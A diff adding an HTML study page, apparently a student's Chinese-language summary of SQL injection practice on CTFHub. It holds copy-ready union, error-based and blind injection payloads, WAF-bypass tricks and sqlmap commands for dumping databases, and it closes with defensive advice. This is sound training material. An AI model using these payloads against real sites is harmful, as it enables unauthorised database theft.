@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【微方法论】Web SQL注入漏洞基础利用与工具实战小结（基于CTFHub）</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        h3 { margin-top: 20px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { border-collapse: collapse; width: 100%; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #e1e4e8; padding: 8px; text-align: left; }
+        th { background-color: #f6f8fa; }
+        .step-flow { display: flex; flex-direction: column; gap: 10px; margin: 15px 0; }
+        .step-flow-item { background-color: #f8f9fa; padding: 10px; border-radius: 5px; border-left: 4px solid #0366d6; }
+        .template-box { background-color: #f0f6ff; border: 1px solid #c8e1ff; padding: 15px; border-radius: 6px; margin-top: 15px; }
+        .template-box h4 { margin-top: 0; color: #0366d6; border-bottom: 1px solid #c8e1ff; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【微方法论】Web SQL注入漏洞基础利用与工具实战小结（基于CTFHub）</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.25 | <strong>分类：</strong>Web安全 | <strong>标签：</strong>SQL注入, SQLmap, Burp Suite, 微方法论, CTFHub</p >
+    </div>
+
+    <h2>1. 简介与核心逻辑</h2>
+    <p>SQL注入的本质，是应用程序未能将用户输入的数据与执行的SQL代码进行严格的分离，导致用户输入被数据库当作代码执行。</p >
+    <p>本次实战的核心攻击逻辑遵循一条标准链路：<strong>寻找注入点 -> 判断注入类型（数字/字符） -> 判断回显方式（联合/报错/盲注） -> 绕过防御机制（WAF） -> 提取数据（脱库）。</strong></p >
+
+    <h2>2. 题型分类与实战差异</h2>
+    
+    <p>基于CTFHub技能树的通关经历，SQL注入可以从以下三个维度进行分类：</p >
+
+    <h3>2.1 按注入点位置分类</h3>
+    <ul>
+        <li><strong>URL参数（常见）：</strong>如 <code>?id=1</code>。最常规的注入点，直接在浏览器地址栏或 BP 的 Repeater 中修改即可。</li>
+        <li><strong>HTTP请求头（隐蔽）：</strong>如 <code>Cookie</code>、<code>User-Agent</code>、<code>Referer</code>。这类注入点无法在浏览器地址栏直接修改，<strong>必须使用 Burp Suite 抓包</strong>修改请求头，或使用 SQLmap 的专属参数（如 <code>--cookie</code>、<code>--user-agent</code>、<code>--referer</code>）。</li>
+    </ul>
+
+    <h3>2.2 按回显方式分类（核心）</h3>
+    <ul>
+        <li><strong>联合查询注入（有回显）：</strong>页面有“黄金回显位”。利用 <code>union select</code> 直接拼接查询结果。注意需要使用 <code>-1</code> 使前半句查询为空，并严格对齐列数。</li>
+        <li><strong>报错注入（无正常回显，有报错信息）：</strong>使用 <code>updatexml()</code> 或 <code>extractvalue()</code> 函数，构造非法参数触发数据库报错，将数据（如库名、表名）在报错信息中带出。</li>
+        <li><strong>布尔盲注（无回显，无报错，只有真假状态）：</strong>页面只返回“对”或“错”。必须使用 <code>if(条件, 1, 1/0)</code> 结合除零报错来制造差异，配合 <code>substr()</code> 和 <code>ascii()</code> 函数，利用二分法逐字猜解。手写脚本网络波动大，推荐使用 SQLmap 的 <code>--technique=B</code>。</li>
+        <li><strong>时间盲注（无回显，无报错，无状态变化）：</strong>页面完全不响应。利用 <code>sleep()</code> 函数（如 <code>if(条件, sleep(5), 0)</code>），通过页面加载的时间差来判断真假。SQLmap 对应 <code>--technique=T</code>。</li>
+    </ul>
+
+    <h3>2.3 按数据库结构分类</h3>
+    <ul>
+        <li><strong>MySQL结构：</strong>查询系统库 <code>information_schema</code>。核心表是 <code>tables</code>（所有表名）和 <code>columns</code>（所有字段名）。无论表名/字段名如何随机生成，都能通过它摸清结构。</li>
+        <li><strong>WAF过滤绕过（如过滤空格）：</strong>后端会过滤特定字符。空格过滤时，使用内联注释 <code>/**/</code> 替代空格；单引号过滤时，可用十六进制 <code>0x...</code> 或双引号绕过。</li>
+    </ul>
+
+    <div class="note">
+        <strong>尚未实战的进阶题型：</strong><br>
+        在 CTFHub 技能树底部，还有“Where后注入”、“AND/OR注入”、“ORDER BY注入”、“二次注入”、“UPDATE注入”、“INSERT注入”等灰色节点。它们本质上仍是SQL注入，只是注入语句所处于的SQL语法位置不同。目前我们已掌握扎实的基础，后续只需根据具体SQL语句所处的上下文进行调整即可。
+    </div>
+
+    <h2>3. 通用解题模板：翻目录心法（核心）</h2>
+    <p>你在实战中总结得非常精准：<strong>所有SQL注入的最终目标，本质上都是在数据库里“翻目录”</strong>。我们利用MySQL自带的系统库 <code>information_schema</code>，按照“库 -> 表 -> 字段 -> 数据”的顺序逐层剥开，最终定位并读取Flag。</p >
+
+    <div class="step-flow">
+        <div class="step-flow-item">
+            <strong>第一步：寻找入口（确定注入点）</strong><br>
+            检查URL参数、Cookie、User-Agent、Referer等位置。尝试闭合字符（<code>1</code>，<code>1'</code>，<code>1")</code>），观察页面是否报错或改变。
+        </div>
+        <div class="step-flow-item">
+            <strong>第二步：确认类型与回显（摸底）</strong><br>
+            测试 <code>and 1=1</code> / <code>and 1=2</code> 判断真假。如果能回显数据，走Union；如果报错回显数据，走报错注入；如果什么都不显示，走盲注。
+        </div>
+        <div class="step-flow-item">
+            <strong>第三步：突破防御（WAF绕过）</strong><br>
+            如果是过滤空格，将Payload中所有空格替换为 <code>/**/</code>；如果是过滤关键字，尝试双写、大小写或内联注释。
+        </div>
+        <div class="step-flow-item">
+            <strong>第四步：逐级翻目录（脱库）</strong>
+        </div>
+    </div>
+
+    <h3>“翻目录”具体操作蓝图（手工与工具对比）：</h3>
+    <table>
+        <tr>
+            <th>层级</th>
+            <th>手工联合查询（有回显）</th>
+            <th>SQLmap 自动化</th>
+        </tr>
+        <tr>
+            <td><strong>第一层：查库名</strong></td>
+            <td><code>-1 union select 1,database()</code></td>
+            <td><code>--dbs</code></td>
+        </tr>
+        <tr>
+            <td><strong>第二层：查表名</strong></td>
+            <td><code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></td>
+            <td><code>-D "库名" --tables</code></td>
+        </tr>
+        <tr>
+            <td><strong>第三层：查字段名</strong></td>
+            <td><code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='表名'</code></td>
+            <td><code>-D "库名" -T "表名" --columns</code></td>
+        </tr>
+        <tr>
+            <td><strong>第四层：查数据</strong></td>
+            <td><code>-1 union select 1,字段名 from 表名</code></td>
+            <td><code>-D "库名" -T "表名" --dump</code></td>
+        </tr>
+    </table>
+
+    <h2>4. 实战Payload与命令模板库（必备参考）</h2>
+    
+    <div class="template-box">
+        <h4>4.1 URL参数注入（手工基础）</h4>
+        <ul>
+            <li><strong>字符型闭合测试：</strong> <code>1' and '1'='1' --+</code> / <code>1' and '1'='2' --+</code></li>
+            <li><strong>联合查询找列数：</strong> <code>1' order by 2 --+</code> (逐步递增)</li>
+            <li><strong>联合查询找回显：</strong> <code>-1' union select 1,2 --+</code></li>
+            <li><strong>查库名：</strong> <code>-1' union select 1,database() --+</code></li>
+            <li><strong>查表名：</strong> <code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></li>
+            <li><strong>查字段名：</strong> <code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='表名' --+</code></li>
+            <li><strong>提取数据：</strong> <code>-1' union select 1,字段名 from 表名 --+</code></li>
+        </ul>
+    </div>
+
+    <div class="template-box">
+        <h4>4.2 报错注入（无回显，有报错）</h4>
+        <ul>
+            <li><strong>查库名：</strong> <code>1' and updatexml(1,concat(0x7e,database()),1) --+</code></li>
+            <li><strong>查表名：</strong> <code>1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+</code></li>
+            <li><strong>查字段名：</strong> <code>1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名')),1) --+</code></li>
+            <li><strong>提取数据：</strong> <code>1' and updatexml(1,concat(0x7e,(select 字段名 from 表名)),1) --+</code></li>
+        </ul>
+    </div>
+
+    <div class="template-box">
+        <h4>4.3 布尔盲注与时间盲注（无回显，无报错）</h4>
+        <ul>
+            <li><strong>布尔盲注逻辑：</strong> <code>1' and if(ascii(substr(database(),1,1))>100, 1, 1/0) --+</code></li>
+            <li><strong>时间盲注逻辑：</strong> <code>1' and if(ascii(substr(database(),1,1))>100, sleep(3), 0) --+</code></li>
+            <li><strong>注意：</strong>这类注入手工猜解极慢，需结合 Python 脚本（二分法）或直接使用 SQLmap 的 <code>--technique=B</code> 或 <code>--technique=T</code>。</li>
+        </ul>
+    </div>
+
+    <div class="template-box">
+        <h4>4.4 HTTP头注入与SQLmap自动化命令</h4>
+        <ul>
+            <li><strong>注入点标记：</strong>在SQLmap参数中，使用星号 <code>*</code> 标记注入位置。</li>
+            <li><strong>Cookie注入：</strong> <code>python sqlmap.py -u "URL" --cookie="id=1*" --dbs --batch --threads=1</code></li>
+            <li><strong>UA注入：</strong> <code>python sqlmap.py -u "URL" --user-agent="1*" --dbs --batch --threads=1</code></li>
+            <li><strong>Referer注入：</strong> <code>python sqlmap.py -u "URL" --referer="1*" --dbs --batch --threads=1</code></li>
+            <li><strong>脱库三连击：</strong> <code>--dbs</code> -> <code>-D "库名" --tables</code> -> <code>-D "库名" -T "表名" --dump</code></li>
+            <li><strong>绕过WAF（如过滤空格）：</strong> <code>python sqlmap.py -u "URL" --tamper="space2comment.py" --dbs --batch --threads=1</code></li>
+            <li><strong>强制联合查询提速（防盲注）：</strong> <code>--technique=U</code></li>
+            <li><strong>单线程保命（防请求过多把环境打挂）：</strong> <code>--threads=1</code></li>
+        </ul>
+    </div>
+
+    <h2>5. 相同点与差异性总结</h2>
+    <ul>
+        <li><strong>相同点（不变的法则）：</strong>
+            <ul>
+                <li>底层的脱库流程完全一致：查库名 -> 查表名 -> 查字段名 -> 提取数据。</li>
+                <li>目标一致：获取隐藏的 Flag（通常位于随机生成的表和字段中）。</li>
+                <li>闭合原理一致：字符型注入都需要闭合引号，并用 <code>#</code> 或 <code>--+</code> 注释掉多余的代码。</li>
+            </ul>
+        </li>
+        <li><strong>差异点（对症下药）：</strong>
+            <ul>
+                <li>Payload 构造取决于回显方式（Union 优先，盲注必须依赖 <code>if()</code> 和 <code>sleep()</code>）。</li>
+                <li>Payload 的绕过方式取决于 WAF 过滤规则（用 <code>/**/</code> 绕空格，用双引号或十六进制绕单引号）。</li>
+                <li>工具的参数配置取决于注入点位置（URL 用 <code>-u</code>，HTTP头用 <code>--user-agent</code> 等）。</li>
+            </ul>
+        </li>
+    </ul>
+
+    <h2>6. 实战避坑指南</h2>
+    <ul>
+        <li><strong>WAF 的静默拦截与误判：</strong>有时候返回状态码是 200（页面正常渲染），但数据为空。这通常不是环境重置，而是 WAF 拦截了特定的关键字组合，直接返回了空结果。此时应尝试改变 Payload 组合或使用 tamper 脚本。</li>
+        <li><strong>不要盲目迷信工具：</strong>SQLmap 的初始启发式探测可能被非标准 WAF 欺骗（如只过滤空格，不回显真假的题目）。如果它报 <code>[CRITICAL] all tested parameters do not appear to be injectable</code>，尝试手动指定 <code>--tamper</code>、<code>--technique</code> 或 <code>--level</code> 级别。</li>
+        <li><strong>随机生成的陷阱：</strong>表名和字段名往往是随机字符串。一旦环境因意外情况重置，之前的随机名称全部失效，需要重新查询。</li>
+        <li><strong>控制并发频率：</strong>跑 SQLmap 时，务必加上 <code>--threads=1</code>。单线程虽慢，但能尽可能避免因高频请求导致服务器主动断开连接。</li>
+    </ul>
+
+    <h2>7. 安全防御建议</h2>
+    <ul>
+        <li><strong>使用参数化查询（预编译语句）：</strong>从根本上将代码与数据分离，这是防御 SQL 注入最有效的手段。</li>
+        <li><strong>最小权限原则：</strong>数据库连接账户只给予必要的增删改查权限，禁止使用 root 或 DBA 权限连接。</li>
+        <li><strong>输入验证与过滤：</strong>对用户输入进行严格的类型检查（如 id 必须是数字），并过滤掉 SQL 关键字和特殊符号。</li>
+        <li><strong>错误信息屏蔽：</strong>关闭生产环境的数据库报错回显，避免攻击者利用报错注入获取敏感信息。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
